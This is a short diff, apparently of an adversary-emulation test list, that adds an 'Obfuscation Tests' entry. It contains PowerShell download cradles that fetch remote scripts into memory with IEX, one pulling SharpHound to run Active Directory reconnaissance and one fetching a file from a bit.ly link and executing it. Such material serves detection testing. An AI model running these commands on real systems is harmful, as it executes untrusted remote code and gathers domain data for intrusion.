@@ -89,5 +89,10 @@ powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githu
 
 powershell -Command "Write-Host 'Remote download of SharpHound.ps1 into memory, followed by execution of the script' -ForegroundColor Cyan; IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1'); Invoke-BloodHound -OutputDirectory $env:Temp; Start-Sleep 5"
 
+* Obfuscation Tests
+  
+(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e', 'Default_File_Path.ps1'); IEX ((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1') | ForEach-Object {[Char]$_})))
+
+
 
 
